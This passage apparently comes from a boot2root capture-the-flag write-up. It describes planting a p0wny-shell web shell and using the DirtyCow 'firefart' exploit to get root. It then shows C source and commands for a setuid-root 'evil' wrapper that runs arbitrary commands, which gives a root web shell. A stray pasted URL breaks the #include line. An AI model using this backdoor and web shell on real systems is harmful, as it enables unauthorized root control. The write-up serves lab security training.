We'll use the same steps as the previous ones to get a shell.

Then we'll push a modified version of [p0wny-shell](https://github.com/flozz/p0wny-shell) to use the executable `evil` that we'll create later.
![[../Images/Capture d’écran 2024-08-05 à 17.37.04.png]]

Then we'll use the firefart exploit (same one as the [Writeup 1 - DirtyCow](../Writeup%201%20-%20DirtyCow.md)) to get a root access and create the `evil` binary.
![[../Images/Capture d’écran 2024-08-05 à 17.40.54.png]]

We can now create `/usr/bin/evil.c`
```c
#include <stdio.h>https://file+.vscode-resource.vscode-cdn.net/Users/guillaume/boot2root/Images/Capture%20d%E2%80%99%C3%A9cran%202024-08-05%20%C3%A0%2017.44.49.png?0.9768794386614355
int main(int ac, char **av) {
    setuid(0);
    setgid(0);
    system(av[1]);
    return 0;
}
```

Now, let's compile it and give it the right permissions:
`gcc /usr/bin/evil.c -o /usr/bin/evil`
`chown firefart:root /usr/bin/evil && chmod 7777 /usr/bin/evil`

We can now go to `https://[VM_IP]/forum/templates_c/webshell.php` and we get a webshell with a root user.
![[../Images/Capture d’écran 2024-08-05 à 17.44.49.png]]